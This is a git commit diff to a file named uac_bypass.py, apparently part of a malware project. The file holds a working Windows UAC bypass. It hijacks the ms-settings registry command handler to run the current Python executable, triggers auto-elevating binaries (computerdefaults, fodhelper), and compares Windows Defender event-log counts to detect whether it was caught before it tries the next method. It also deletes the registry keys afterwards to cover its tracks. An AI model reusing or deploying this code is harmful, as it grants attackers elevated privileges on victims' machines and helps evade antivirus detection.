41620ca67839de5b80e1c621a8fef7216749a3ce
voyqge <96620548+voyqge@users.noreply.github.com>
2023-12-02 21:31:30 +0100

    Update uac_bypass.py

--- resources/source/bin/uac_bypass.py
+++ resources/source/bin/uac_bypass.py
@@ -4,22 +4,22 @@ import sys
 
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
-        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True).stdout.decode().splitlines()
         if method == 1:
             execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
             execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
             execute("computerdefaults --nouacbypass")
-            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
             execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
             if log_count_after > log_count_before:
                 return UACbypass(method + 1)
         elif method == 2:
             execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
             execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
             execute("fodhelper --nouacbypass")
-            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
             execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
             if log_count_after > log_count_before:
                 return UACbypass(method + 1)
